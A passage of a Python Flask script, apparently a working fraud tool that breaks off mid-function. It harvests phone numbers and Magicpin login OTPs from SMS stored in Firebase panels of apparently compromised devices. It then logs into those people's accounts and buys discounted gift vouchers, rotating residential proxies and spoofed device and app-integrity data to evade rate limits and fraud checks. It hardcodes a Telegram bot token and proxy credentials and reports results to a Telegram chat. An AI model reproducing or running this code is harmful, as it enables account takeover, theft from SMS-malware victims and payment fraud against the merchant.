#!/usr/bin/env python3
"""
Magicpin • FINAL v13 — ROTATING PROXY (arealproxy API) + DIRECT FIREBASE
- Panel fetches → DIRECT (no proxy)
- Magicpin API calls → rotating residential IN proxy from arealproxy API
- Paid click → direct ledger section → newest BOUGHT numeric → voucher code
- Per-job Refetch button
- /api/update_job for recapture.py integration
"""
import json, re, time, hashlib, secrets, uuid, random, requests, os, sys
import base64, urllib.parse, threading, traceback
import asyncio
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Optional, Dict, List
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import urllib3
from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ═══════════════════ CONFIG ═══════════════════
TG_TOKEN = "8849270821:AAGYYAdcLtZKiEODQ991X-ul8hZAZhqzDoM"
TG_CHAT  = "7640839909"

# ---- Rotating residential proxy (fetched from arealproxy API) ----
PROXY_API_URL = (
    "https://api.arealproxy.com/v1/proxy"
    "?username=cc141ee0bf7b54e315"
    "&password=dda0b7d4-4086-4b12-bf63-c49b2812f521"
    "&plan_type=residential&country=in&mode=rotating&count=50"
)
PROXY_ENABLED  = True
PROXY_CACHE_TTL = 300          # refresh proxy list every 5 min

VOUCHERS = {
    "flipkart": {
        "name": "Flipkart", "icon": "🛒",
        "merchant_id": "3438321", "voucher_id": "3189281",
        "coupon": "SHOP101FP1", "face_value": 10,
        "pg_amount": 1, "magicpin_amount": 0.00,
    },
    "googleplay": {
        "name": "Google Play", "icon": "▶️",
        "merchant_id": "26759740", "voucher_id": "1907919",
        "coupon": "SHOP101GP1", "face_value": 10,
        "pg_amount": 1, "magicpin_amount": 0.00,
    },
    "uber": {
        "name": "Uber", "icon": "🚗",
        "merchant_id": "4729943", "voucher_id": "3189034",
        "coupon": "SHOP101UB1", "face_value": 10,
        "pg_amount": 0.97, "magicpin_amount": 0.00,
    },
    "amazonpay": {
        "name": "Amazon Pay", "icon": "📦",
        "merchant_id": "5980613", "voucher_id": "1687571",
        "coupon": "SHOP101AP40", "face_value": 50,
        "pg_amount": 34.65, "magicpin_amount": 15.35,
    },
    "zepto": {
        "name": "Zepto", "icon": "🥦",
        "merchant_id": "11732228", "voucher_id": "2377160",
        "coupon": "SUMMERSURPRISE", "face_value": 100,
        "pg_amount": 80.05, "magicpin_amount": 21.00,
    },
}
DEFAULT_VOUCHER = "flipkart"

FIRST_NAME = "rahul"
EMAIL      = "kjklasdj@gmail.com"
PKG        = "com.magicpin.local"
VER        = 1215
VERNAME    = "1.118.4"
LAT, LON   = "28.6139390055", "77.20902224216667"
UPI_LIST   = "paytm,phonepe,gpay,mobikwik,amazonpay,navi"

UPI_TRIES = [
    ("phonepe",  "phonepe"),
    ("paytm",    "paytm"),
    ("gpay",     "gpay"),
    ("mobikwik", "mobikwik"),
    ("amazonpay","amazonpay"),
]

OTP_SETTLE_SECONDS = 0
OTP_POLL_TIMEOUT   = 75
OTP_FLOOR_MS       = 5_000
OTP_MAX_AGE_MS     = 180_000
EXTRACT_WORKERS    = 200

PARALLEL_WORKERS   = 10
COUPON_MAX_TRIES   = 5
COUPON_RETRY_GAP   = 1
MAX_RELOGINS       = 3

VOUCHER_CODE_RETRIES = 5
VOUCHER_CODE_GAP     = 3
LEDGER_MAX_PAGES     = 3

OTP_LIMIT_RETRIES  = 6

DEVICE = {}
USED_OTPS: Dict[str, set] = {}
USED_OTPS_LOCK = threading.Lock()

DEVICE_PROFILES = [
    {"name": "Samsung Galaxy A53",   "manufacturer": "Samsung",  "model": "SM-A536E"},
    {"name": "Samsung M13",          "manufacturer": "Samsung",  "model": "SM-M135F"},
    {"name": "Samsung A14",          "manufacturer": "Samsung",  "model": "SM-A146B"},
    {"name": "Xiaomi Redmi Note 12", "manufacturer": "Xiaomi",   "model": "23021RAAEG"},
    {"name": "Xiaomi Redmi 11",      "manufacturer": "Xiaomi",   "model": "2201117TI"},
    {"name": "Xiaomi Poco X5",       "manufacturer": "Xiaomi",   "model": "22101316I"},
    {"name": "OnePlus Nord CE 3",    "manufacturer": "OnePlus",  "model": "CPH2569"},
    {"name": "OnePlus 11R",          "manufacturer": "OnePlus",  "model": "CPH2447"},
    {"name": "Realme 11 Pro",        "manufacturer": "realme",   "model": "RMX3771"},
    {"name": "Realme Narzo 60",      "manufacturer": "realme",   "model": "RMX3630"},
    {"name": "Vivo V29",             "manufacturer": "vivo",     "model": "V2250"},
    {"name": "Vivo Y28",             "manufacturer": "vivo",     "model": "V2230"},
    {"name": "Oppo Reno 10",         "manufacturer": "OPPO",     "model": "CPH2451"},
    {"name": "Oppo A78",             "manufacturer": "OPPO",     "model": "CPH2477"},
    {"name": "Motorola G84",         "manufacturer": "motorola", "model": "XT2343-1"},
]

PAY_INITIATE = "https://pg.magicpin.com/pg/payment/initiate"
LEDGER_URL   = "https://webapi.magicpin.in/transactions/ledger/history"
PG_UA = ("Mozilla/5.0 (iPhone; CPU iPhone OS 26_5_0 like Mac OS X) "
         "AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/149.0.7827.137 "
         "Mobile/15E148 Safari/604.1")

# ═══════════════════ LOGGING ═══════════════════
class C:
    RESET="\033[0m"; BOLD="\033[1m"; DIM="\033[2m"
    RED="\033[31m"; GRN="\033[32m"; YEL="\033[33m"
    BLU="\033[34m"; MAG="\033[35m"; CYN="\033[36m"; WHT="\033[97m"

def ok(m):   print(f"{C.GRN}[+]{C.RESET} {m}", flush=True)
def info(m): print(f"{C.CYN}[*]{C.RESET} {m}", flush=True)
def warn(m): print(f"{C.YEL}[!]{C.RESET} {m}", flush=True)
def err(m):  print(f"{C.RED}[-]{C.RESET} {m}", flush=True)

def banner(t):
    line = "═" * 60
    print(f"\n{C.MAG}╔{line}╗{C.RESET}")
    pad = (60 - len(t)) // 2
    print(f"{C.MAG}║{C.RESET}{' ' * pad}{C.BOLD}{C.WHT}{t}{C.RESET}{' ' * (60 - len(t) - pad)}{C.MAG}║{C.RESET}")
    print(f"{C.MAG}╚{line}╝{C.RESET}")

# ═══════════════════ PROXY POOL ═══════════════════
_proxy_cache = {"list": [], "fetched_at": 0}
_proxy_lock = threading.Lock()


def fetch_proxy_list(force: bool = False):
    """Fetch rotating proxy list from arealproxy. Cached for PROXY_CACHE_TTL seconds."""
    now = time.time()
    with _proxy_lock:
        if (not force and _proxy_cache["list"]
                and (now - _proxy_cache["fetched_at"]) < PROXY_CACHE_TTL):
            return _proxy_cache["list"]
        try:
            r = requests.get(PROXY_API_URL, timeout=15)
            r.raise_for_status()
            parsed = []
            for line in r.text.strip().splitlines():
                line = line.strip()
                if not line:
                    continue
                # format: host:port:user:pass
                parts = line.split(":", 3)
                if len(parts) == 4:
                    parsed.append({
                        "host": parts[0].strip(),
                        "port": parts[1].strip(),
                        "user": parts[2].strip(),
                        "pass": parts[3].strip(),
                    })
            if parsed:
                _proxy_cache["list"] = parsed
                _proxy_cache["fetched_at"] = now
                info(f"proxy list refreshed: {len(parsed)} entries")
            return _proxy_cache["list"]
        except Exception as e:
            err(f"proxy API fetch failed: {e}")
            return _proxy_cache["list"]


def get_proxy_for_phone(phone: str, salt: str = "") -> str:
    """Pick a random proxy from the pool and return a full proxy URL."""
    if not PROXY_ENABLED:
        return ""
    proxies = fetch_proxy_list()
    if not proxies:
        return ""
    p = random.choice(proxies)
    user_enc = urllib.parse.quote(p["user"], safe="")
    pw_enc   = urllib.parse.quote(p["pass"], safe="")
    return f"http://{user_enc}:{pw_enc}@{p['host']}:{p['port']}"


class ProxySession(requests.Session):
    def __init__(self, proxy_url: str = ""):
        super().__init__()
        self._proxy_url = proxy_url
        retry = Retry(total=3, connect=3, read=3, backoff_factor=0.6,
                      status_forcelist=(429, 500, 502, 503, 504),
                      allowed_methods=frozenset(["GET", "POST", "PUT", "DELETE"]),
                      raise_on_status=False)
        adapter = HTTPAdapter(max_retries=retry,
                              pool_connections=EXTRACT_WORKERS,
                              pool_maxsize=EXTRACT_WORKERS)
        self.mount("http://", adapter)
        self.mount("https://", adapter)

    def request(self, method, url, **kwargs):
        if self._proxy_url and "proxies" not in kwargs:
            kwargs["proxies"] = {"http": self._proxy_url, "https": self._proxy_url}
        kwargs.setdefault("verify", False)
        return super().request(method, url, **kwargs)


# Boot-time proxy list fetch (do not block startup if it fails)
PROXY_URL_DEFAULT = get_proxy_for_phone("default") if PROXY_ENABLED else ""

SESSION = ProxySession(PROXY_URL_DEFAULT)      # Magicpin calls → rotating IN proxy
SESSION_DIRECT = ProxySession("")              # Firebase calls → NO proxy

# ═══════════════════ TELEGRAM ═══════════════════
def tg_send(text):
    try:
        requests.post(f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage",
                      json={"chat_id": TG_CHAT, "text": text,
                            "parse_mode": "HTML", "disable_web_page_preview": True},
                      timeout=20)
    except Exception as e:
        err(f"tg_send: {e}")

# ═══════════════════ HELPERS ═══════════════════
def generate_device(phone):
    seed_str = f"{phone}_{int(time.time() * 1000)}_{random.randint(0, 999999)}"
    seed = int(hashlib.md5(seed_str.encode()).hexdigest(), 16) % (2**32)
    rng = random.Random(seed)
    prof = rng.choice(DEVICE_PROFILES)
    did = "".join(rng.choice("0123456789abcdef") for _ in range(16))
    gaid = str(uuid.UUID(int=random.Random().getrandbits(128), version=4))
    return {"device_id": did, "manufacturer": prof["manufacturer"],
            "model": prof["model"], "gaid": gaid, "name": prof["name"]}

def normalize_phone(p):
    p = str(p).strip().replace("+","").replace(" ","").replace("-","")
    if p.startswith("91") and len(p) == 12: return p
    if len(p) == 10: return "91" + p
    return p

def normalize_phone_10(p):
    if not p: return None
    d = re.sub(r"\D", "", str(p))
    if len(d) > 10:
        if d.startswith("91"): d = d[2:]
        elif d.startswith("0"): d = d[1:]
        else: d = d[-10:]
    if len(d) == 10 and d[0] in "6789": return d
    return None

def nonce(n=16):
    abc = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
    return "".join(secrets.choice(abc) for _ in range(n))

def base_headers(token="", uid="", theme="light"):
    return {"selected-lon": LON, "lon": LON, "package-name": PKG,
            "auth-userid": str(uid), "device-width": "600", "device-height": "1066",
            "auth-user-token": token, "selected-lat": LAT, "user-country": "IN",
            "version-code": str(VER), "device-scale-factor": "1.5",
            "theme": theme, "is-device-rooted": "false", "lang": "en",
            "helpdesk-version": "8", "lat": LAT,
            "content-type": "application/json; charset=UTF-8",
            "accept-encoding": "gzip", "user-agent": "okhttp/4.12.0"}

def _api_headers(token, uid):
    return {"auth-user-token": token, "auth-userid": str(uid),
            "package-name": PKG, "version-code": str(VER),
            "user-country": "IN", "lang": "en",
            "accept-encoding": "gzip", "user-agent": "okhttp/4.12.0",
            "content-type": "application/json; charset=UTF-8"}

def _ledger_headers(token, uid):
    return {"selected-lon": LON, "lon": LON, "package-name": PKG,
            "auth-userid": str(uid), "device-width": "600", "device-height": "1066",
            "auth-user-token": token, "selected-lat": LAT, "user-country": "IN",
            "version-code": str(VER), "device-scale-factor": "1.5",
            "theme": "light", "is-device-rooted": "false", "lang": "en",
            "helpdesk-version": "8", "lat": LAT,
            "accept-encoding": "gzip", "user-agent": "okhttp/4.12.0"}

def _pg_headers(txn, extra_cookies: Optional[str] = None):
    h = {"accept": "application/json, text/plain, */*",
         "content-type": "application/json",
         "origin": "https://pg.magicpin.com",
         "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors",
         "sec-fetch-dest": "empty",
         "referer": f"https://pg.magicpin.com/page/{txn}/startpayment",
         "accept-language": "en-IN,en;q=0.9",
         "user-agent": PG_UA}
    if extra_cookies:
        h["cookie"] = extra_cookies
    return h

def _cookies_to_header(cookiejar) -> str:
    try:
        parts = []
        for c in cookiejar:
            parts.append(f"{c.name}={c.value}")
        return "; ".join(parts)
    except Exception:
        return ""

def build_metadata(device=None):
    d = device or DEVICE
    return {
        "locationInfo": ('{\n  "isLocationSpoofed": false,\n'
            f'  "currentLongitude": "{LON}",\n'
            '  "isNetworkProviderEnabled": true,\n'
            f'  "currentLatitude": "{LAT}",\n'
            '  "isGpsProviderEnabled": true,\n'
            '  "isSessionFreshLocationFetched": true\n}'),
        "appEnvironmentInfo": ('{\n  "is_unverified_app": false,\n'
            '  "is_device_rooted": false,\n'
            '  "is_network_operator_absent": false,\n'
            '  "is_cloned_app": false,\n'
            '  "is_device_emulator": false,\n'
            '  "encrypted_apk_signature": "SJX+9pGcvl2+yjn/SE9AXQ==$+Gw+RyuIfqt62Jn4Q1iC0NFmIWzA3GG7lw04TJ7euiG8sqqtrjqfvEKNAsxop7kJb6JimnFlaY8VN/QeOOfYOuSdsdy7QUvCeCLaMumW9BjxzX5OhUSKMVqKDY9ckJ8l",\n'
            '  "is_sim_absent": false\n}'),
        "session_id": f"{uuid.uuid4()}-{int(time.time()*1000)}",
        "deviceDto": ('{\n  "deviceId": "' + d["device_id"] + '",\n'
            '  "deviceManufacturer": "' + d["manufacturer"] + '",\n'
            '  "deviceModel": "' + d["model"] + '",\n'
            '  "ipAddress": "106.219.232.25",\n'
            '  "networkCarrier": "CHINA MOBILE"\n}')}

def query_params(voucher_id=""):
    qp = {"campaign_utm_source": "shop", "pageSource": "wallet",
          "roaid": voucher_id, "utm_source": "shop"}
    return json.dumps(qp)

# ═══════════════════ PANEL PARSE ═══════════════════
PHONE_PATTERNS = [
    re.compile(r"\b(?:\+91|91|0)?([6-9]\d{9})\b"),
    re.compile(r"\b(?:phone|mobile|number|contact)[\s:]*([6-9]\d{9})\b", re.IGNORECASE),
    re.compile(r"[^0-9]([6-9]\d{9})[^0-9]")]

def parse_panel_link(link):
    if not link: return None
    link = link.strip()
    if link.startswith("https://") and ("firebaseio.com" in link or "firebasedatabase.app" in link):
        return link if link.endswith("/") else link + "/"
    try:
        parsed = urllib.parse.urlparse(link)
        qs = urllib.parse.parse_qs(parsed.query)
        if "s" not in qs: return None
        s = qs["s"][0] + "=" * ((4 - len(qs["s"][0]) % 4) % 4)
        dec = base64.b64decode(s).decode("utf-8").split("|")[0].strip()
        return dec if dec.endswith("/") else dec + "/"
    except Exception:
        return None

def extract_phone_from_text(text):
    if not text: return None
    for pat in PHONE_PATTERNS:
        m = pat.search(text)
        if m:
            phone = m.group(1) if m.groups() else m.group(0)
            norm = normalize_phone_10(phone)
            if norm: return norm
    return None

def fetch_one_client(fb_url, c_id, clients_data, session=None):
    sess = session or SESSION_DIRECT    # Firebase → direct, never proxied
    try:
        cd = clients_data.get(c_id, {}) or {}
        direct = cd.get("phone") or cd.get("mobile") or cd.get("number") or cd.get("phoneNumber")
        if direct:
            norm = normalize_phone_10(direct)
            if norm: return {"client_id": c_id, "phone": norm}
        r = sess.get(f'{fb_url}messages/{c_id}.json?orderBy="$key"&limitToLast=50', timeout=10)
        dmsgs = r.json()
        if not isinstance(dmsgs, dict): dmsgs = {}
        parts = []
        for msg in dmsgs.values():
            if isinstance(msg, dict):
                parts.append(str(msg.get("body") or msg.get("message") or msg.get("text") or msg.get("sms") or ""))
            elif isinstance(msg, str):
                parts.append(msg)
        phone = extract_phone_from_text(" ".join(parts))
        if phone: return {"client_id": c_id, "phone": phone}
    except Exception:
        pass
    return None

def extract_phones_and_clients(fb_url):
    try:
        r = SESSION_DIRECT.get(fb_url + "clients.json", timeout=20)   # DIRECT
        clients_data = r.json()
        if not isinstance(clients_data, dict): clients_data = {}
    except Exception as e:
        err(f"panel fetch fail: {e}"); return []
    online = [cid for cid, cd in clients_data.items()
              if isinstance(cd, dict) and cd.get("status")]
    if not online: return []
    info(f"{len(online)} online devices — extracting numbers…")
    result, seen = [], set()
    lock = threading.Lock()
    with ThreadPoolExecutor(max_workers=EXTRACT_WORKERS) as ex:
        futs = [ex.submit(fetch_one_client, fb_url, cid, clients_data) for cid in online]
        for fut in as_completed(futs):
            try: res = fut.result()
            except: continue
            if not res: continue
            with lock:
                if res["phone"] in seen: continue
                seen.add(res["phone"]); result.append(res)
    info(f"{len(result)} unique numbers on this panel")
    return result

# ═══════════════════ OTP ═══════════════════
def find_otp_in_msgs(msgs, trigger_time_ms, phone=""):
    if not isinstance(msgs, dict): return None
    try:
        sorted_msgs = sorted(msgs.items(),
            key=lambda x: int(x[0]) if str(x[0]).isdigit() else 0,
            reverse=True)
    except Exception:
        sorted_msgs = list(msgs.items())
    with USED_OTPS_LOCK:
        used = USED_OTPS.get(phone, set()).copy()
    for msg_id, md in sorted_msgs:
        if not isinstance(md, dict) or not str(msg_id).isdigit(): continue
        if int(msg_id) < trigger_time_ms: continue
        sender = str(md.get("sender", "")).lower()
        raw = md.get("body") or md.get("message") or md.get("text") or md.get("sms") or ""
        body = str(raw).lower()
        if "mgcpnp" in sender or "magicpin" in sender or "magicpin" in body:
            m = re.search(r'(?i)(?:magicpin|mgcpnp).*?(?:code|login|is|:)\s*(\d{6})', body)
            if not m: m = re.search(r'\b(\d{6})\b', body)
            if m:
                otp = m.group(1)
                if otp in used: continue
                if trigger_time_ms and (int(msg_id) - trigger_time_ms) > OTP_MAX_AGE_MS: continue
                return otp
    return None

def _fetch_otp_from_panel(fb_url, client_id, min_ts_ms, phone="",
                          settle=OTP_SETTLE_SECONDS, timeout=OTP_POLL_TIMEOUT,
                          session=None):
    # Firebase does NOT need proxy — always direct
    sess = SESSION_DIRECT
    if settle: time.sleep(settle)
    deadline = time.time() + timeout
    floor = int(min_ts_ms) - OTP_FLOOR_MS
    while time.time() < deadline:
        try:
            r = sess.get(f'{fb_url}messages/{client_id}.json?orderBy="$key"&limitToLast=30', timeout=6)
            if r.status_code == 200:
                otp = find_otp_in_msgs(r.json(), floor, phone=phone)
                if otp: return otp
        except Exception: pass
        time.sleep(1.5)
    return ""

def _mark_otp_used(phone, otp):
    with USED_OTPS_LOCK:
        USED_OTPS.setdefault(phone, set()).add(otp)

# ═══════════════════ SEND OTP / LOGIN ═══════════════════
def send_otp(phone, headers, session=None):
    sess = session or SESSION
    info(f"SendOtp -> {phone}")
    try:
        r = sess.post("https://auth.magicpin.in/SendOtp/V2/", headers=headers,
                      json={"phone_no": phone, "sms_service_flag": "0",
                            "app-version-name": VERNAME, "app-version": VER},
                      timeout=25)
    except Exception as e:
        err(f"SendOtp request err: {e}")
        return "HTTP_ERR", str(e)
    info(f"HTTP {r.status_code}: {r.text[:200]}")
    if r.status_code != 200: return "HTTP_ERR", f"status {r.status_code}"
    try: d = r.json()
    except: return "BAD_JSON", r.text[:120]
    status_field = str(d.get("Status") or d.get("status") or "").strip()
    msg_field = str(d.get("msg") or d.get("message") or "").strip()
    lm = msg_field.lower()
    if "max rate limit" in lm: return "LIMIT", msg_field
    for needle in ("exceeded","trial","limit","too many","retry","blocked","rate","cooldown"):
        if needle in lm: return "LIMIT", msg_field or "trial limit hit"
    if status_field.lower() == "success": return "OK", msg_field or "OTP sent"
    if status_field.lower() in ("failure","error","failed"): return "FAIL", msg_field or "send failed"
    if not status_field: return "FAIL", f"unknown: {json.dumps(d)[:120]}"
    return "OK", msg_field or status_field

def send_otp_with_retry(phone, jid=None, relogin_round=1):
    last_sess = None; last_dev = None
    for attempt in range(1, OTP_LIMIT_RETRIES + 1):
        dev = generate_device(phone)
        # fresh proxy from pool each attempt → new exit IP
        salt = f"r{relogin_round}_a{attempt}_{int(time.time()*1000)}_{random.randint(0,9999)}"
        sess = ProxySession(get_proxy_for_phone(phone, salt=salt)) if PROXY_ENABLED else SESSION
        last_sess = sess; last_dev = dev
        try:
            ipr = sess.get("https://api.ipify.org?format=json", timeout=10)
            cur_ip = ipr.json().get("ip", "?")
            info(f"SendOtp [r{relogin_round} a{attempt}] exit IP = {cur_ip}")
        except Exception:
            pass
        h = base_headers()
        code, detail = send_otp(phone, h, session=sess)
        if code == "OK":
            return "OK", detail, sess, dev
        if code == "LIMIT":
            short_wait = 2 + attempt
            warn(f"LIMIT [{detail}] (r{relogin_round} a{attempt}) — rotate IP, wait {short_wait}s")
            if jid:
                _log(jid, f"SendOtp LIMIT ({detail}) — rotate IP ({short_wait}s)")
            time.sleep(short_wait)
            continue
        return code, detail, sess, dev
    return "LIMIT", f"exceeded trials after {OTP_LIMIT_RETRIES} IP changes", last_sess, last_dev

def login(phone, otp, headers, device=None, session=None):
    sess = session or SESSION
    d_dev = device or DEVICE
    ts = str(int(time.time()*1000)); nc = nonce()
    tok = hashlib.md5(f"{d_dev['device_id']}{ts}{nc}".encode()).hexdigest()
    inner = {"apiParams": {"utmSource":"google-play","utmMedium":"organic"},
             "callOtp": False, "device_id": d_dev["device_id"],
             "device_manufacturer": d_dev["manufacturer"],
             "device_model": d_dev["model"],
             "googleAdvertisingId": d_dev["gaid"],
             "installDeeplinkParams": json.dumps({"utm_medium":["organic"],"utm_source":["google-play"]}, indent=2),
             "is_rooted": False, "login_method": "", "nonce": nc, "otp": otp,
             "prefilledOtp": False, "prefilledPhone": False,
             "timestamp": ts, "phone_number": phone}
    hexd = json.dumps(inner, separators=(",",":")).encode().hex()
    sig = hashlib.sha256(f"{phone}{otp}{nc}{ts}{tok}".encode()).hexdigest()
    body = {"apiParams": {"utmSource":"google-play","utmMedium":"organic"},
            "callOtp": False, "data": hexd, "device_id": d_dev["device_id"],
            "device_manufacturer": d_dev["manufacturer"],
            "device_model": d_dev["model"], "googleAdvertisingId": d_dev["gaid"],
            "installDeeplinkParams": json.dumps({"utm_medium":["organic"],"utm_source":["google-play"]}, indent=2),
            "is_rooted": False, "login_method": "", "nonce": nc, "otp": otp,
            "prefilledOtp": False, "prefilledPhone": False,
            "signature": sig, "timestamp": ts, "token": tok, "phone_number": phone}
    info("Login")
    try:
        r = sess.post("https://webapi.magicpin.in/ultron-aryan/login/",
                      headers=headers, json=body, timeout=25)
    except Exception as e:
        err(f"Login err: {e}"); return None
    info(f"HTTP {r.status_code}")
    try:
        d = r.json()
        if d.get("status") == "SUCCESS": return d
    except Exception:
        pass
    return None

def _classify_user(d):
    if d.get("is_new_user") is True: return "NEW"
    name = (d.get("name") or "").strip()
    email = (d.get("email_id") or "").strip()
    city = (d.get("city") or "").strip()
    nux = (d.get("nuxStatus") or "").strip()
    if name or email or city: return "OLD"
    if nux and nux.upper() != "NULL": return "OLD"
    for r in (d.get("nuxRewards") or []):
        if not isinstance(r, dict): continue
        if r.get("alreadyRewarded") is not None: return "OLD"
        if r.get("rewardPoints") is not None: return "OLD"
        if r.get("referralApplied") is not None: return "OLD"
    try: pct = int(d.get("profile_completion_percentage") or 0)
    except: pct = 0
    if pct > 0: return "OLD"
    return "NEW"

# ═══════════════════ CHECKOUT ═══════════════════
def checkout(phone, token, uid, voucher: dict, first_name=FIRST_NAME,
             email=EMAIL, device=None, session=None):
    sess = session or SESSION
    d_dev = device or DEVICE
    vid  = voucher["voucher_id"]
    mid  = voucher["merchant_id"]
    cpn  = voucher["coupon"]
    url  = "https://pay.magicpin.in/voucher/checkout"

    def _build_body(cc, mode):
        data_block = {
            "VOUCHER": [{"items": [{"id": vid, "quantity": 1, "selected": True}],
                         "merchantUserId": mid}],
            "MAGICPRO": [{"items": [{"id": "1", "quantity": 0, "selected": False,
                                     "type": "MAGICPRO"}]}],
            "MAGIC_CREDIT_SELECTED": [{"items": [{"id": "MAGIC_CREDIT_SELECTED",
                "quantity": 0, "selected": False, "type": "MAGIC_CREDIT_SELECTED"}],
                "merchantUserId": mid}],
        }
        body = {
            "metadata": build_metadata(device=d_dev),
            "data": data_block,
            "queryParams": query_params(vid if mode in ("query","all") else ""),
            "clone_app_package_count": 1, "cartId": "", "upiAvailable": "",
            "application_id": PKG, "phoneNo": phone, "firstName": first_name,
            "isLocationSpoofed": False, "package_name": PKG,
            "crossSellAdded": False, "merchantUserId": "",
            "showUpsellBottomSheet": True, "email": email,
        }
        body["userCoupon"] = cc if mode in ("body","all") else ""
        if mode in ("body","all"):
            body["couponCode"] = cc
        if mode in ("data","all"):
            data_block["userCoupon"] = cc
            data_block["couponCode"] = cc
        return body

    def _do(cc, mode):
        body = _build_body(cc, mode)
        try:
            r = sess.post(url, headers=base_headers(token, uid), json=body, timeout=30)
            try: return r.status_code, r.json()
            except Exception: return r.status_code, None
        except Exception as e:
            return None, {"_err": str(e)[:120]}

    def _parse(d):
        if not d: return None, "", "", False
        data     = d.get("data") or {}
        ci       = data.get("userCouponInfo") or {}
        pg_raw   = data.get("pgAmount")
        c_status = (ci.get("status") or "").strip().upper()
        c_msg    = (ci.get("message") or "").strip()
        try: pg_amt = float(pg_raw) if pg_raw is not None else None
        except: pg_amt = None
        ml = c_msg.lower()
        blocked = ("re-install" in ml or "reinstall" in ml
                   or "daily usage limit" in ml or "exceeded daily" in ml)
        if blocked:
            c_status = "BLOCKED"
        return pg_amt, c_status, c_msg, blocked

    plan = [("auto",""), ("body",cpn), ("data",cpn),
            ("query",cpn), ("all",cpn)]
    last_parse = (None, "", "", False)
    for i, (mode, cc) in enumerate(plan, 1):
        info(f"Checkout [{voucher['name']}] try {i}/{COUPON_MAX_TRIES} mode={mode}")
        st, d = _do(cc, mode)
        pg_amt, cs, cm, blocked = _parse(d)
        last_parse = (pg_amt, cs, cm, blocked)
        info(f"  HTTP {st} | coupon={cs or '-'} | pgAmt={pg_amt} | {(cm or '')[:80]}")
        if blocked:
            warn("→ BLOCKED by Magicpin (re-install signal)")
            return last_parse
        if pg_amt is not None and pg_amt <= voucher["pg_amount"] + 0.5:
            ok(f"→ coupon APPLIED (try {i}, pgAmt={pg_amt}, expected≤{voucher['pg_amount']})")
            return (pg_amt, "SUCCESS", cm, False)
        time.sleep(COUPON_RETRY_GAP)
    warn(f"→ {COUPON_MAX_TRIES} tries ke baad bhi coupon nahi laga")
    return last_parse

# ═══════════════════ PAYOUTAPP ═══════════════════
def payoutapp(phone, token, uid, amount, voucher: dict,
              first_name=FIRST_NAME, email=EMAIL, device=None, session=None):
    sess = session or SESSION
    d_dev = device or DEVICE
    vid  = voucher["voucher_id"]
    mid  = voucher["merchant_id"]
    cpn  = voucher["coupon"]
    mp_amt = voucher["magicpin_amount"]
    url  = "https://pg.magicpin.com/pg/page/payment/payoutapp"
    body = {"firstName": first_name, "phone": phone, "email": email,
        "amount": amount, "userId": str(uid), "accessToken": token,
        "type": "wallet", "userType": "CUSTOMER", "paymentMotive": "VOUCHER_PURCHASE",
        "upiAvailable": UPI_LIST,
        "deviceDto": {"deviceManufacturer": d_dev["manufacturer"],
                      "deviceModel": d_dev["model"],
                      "networkCarrier": "--", "ipAddress": ""},
        "isCredInstalled": False, "isGojekInstalled": False,
        "couponData": {"metadata": build_metadata(device=d_dev),
            "data": {
                "MAGIC_CREDIT_SELECTED": [{"merchantUserId": mid,
                    "items": [{"type": "MAGIC_CREDIT_SELECTED",
                               "id": "MAGIC_CREDIT_SELECTED",
                               "quantity": 0, "selected": False}]}],
                "VOUCHER": [{"merchantUserId": mid,
                    "items": [{"id": vid, "quantity": 1, "selected": True}]}]},
            "userCoupon": cpn, "phoneNo": phone, "email": email,
            "firstName": first_name, "queryParams": query_params(vid),
            "removeAutoApplyCouponCode": False, "crossSellAdded": False,
            "isLocationSpoofed": False, "showUpsellBottomSheet": True,
            "merchantUserId": mid,
            "upiAvailable": UPI_LIST.replace(",", ", "),
            "roaId": vid, "magicpinAmount": mp_amt, "pgAmount": amount,
            "magicProSubscriptionId": "", "paymentMotive": "VOUCHER_PURCHASE",
            "transactionType": "redemption", "phone": phone, "phone_no": phone,
            "lat": float(LAT), "lon": float(LON),
            "mp-authorization": token, "app-version": "2379",
            "app-version-name": "IOS-4.7.54", "country": "IN",
            "userId": str(uid), "useMPWallet": 1}}
    h = {"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
         "origin": "null",
         "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
         "content-type": "application/json",
         "accept-language": "en-IN,en;q=0.9",
         "accept-encoding": "gzip, deflate, br"}
    info(f"Payoutapp [{voucher['name']}] amount={amount} mp_amt={mp_amt}")
    try:
        r = sess.post(url, headers=h, data=json.dumps(body),
                      allow_redirects=False, timeout=30)
    except Exception as e:
        return None, f"req fail: {e}", None
    info(f"HTTP {r.status_code}")
    loc = r.headers.get("Location") or ""
    info(f"Location: {loc}")
    if r.status_code != 302: return None, f"HTTP {r.status_code}", None
    if "payment_status=failure" in loc:
        m = re.search(r"message=([^&]+)", loc)
        msg = urllib.parse.unquote_plus(m.group(1)) if m else "fail"
        return None, msg, None
    m = re.search(r"/page/([0-9a-f]{16,32})/startpayment", loc)
    if not m: return None, "unexpected location", None
    cookies_header = _cookies_to_header(sess.cookies)
    info(f"payout cookies: {cookies_header[:120] or '(none)'}")
    return m.group(1), None, cookies_header

# ═══════════════════ UPI INITIATE ═══════════════════
def _prime_startpayment_page(txn, session, cookie_header=None):
    url = f"https://pg.magicpin.com/page/{txn}/startpayment"
    h = {"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
         "accept-language": "en-IN,en;q=0.9",
         "user-agent": PG_UA,
         "referer": "https://pg.magicpin.com/"}
    if cookie_header:
        h["cookie"] = cookie_header
    try:
        r = session.get(url, headers=h, timeout=20, allow_redirects=True)
        info(f"prime startpayment: HTTP {r.status_code} len={len(r.text)}")
        try: session.cookies.update(r.cookies)
        except Exception: pass
        return True
    except Exception as e:
        warn(f"prime fail: {e}")
        return False

def initiate_upi(txn, uid, phone, email, amount, voucher: dict,
                 instrument="phonepe", parent=None, session=None,
                 cookie_header=None):
    sess = session or SESSION
    parent = parent or instrument
    mp_amt = voucher["magicpin_amount"]
    body = {"mpTransactionId": txn, "userId": str(uid), "amount": amount,
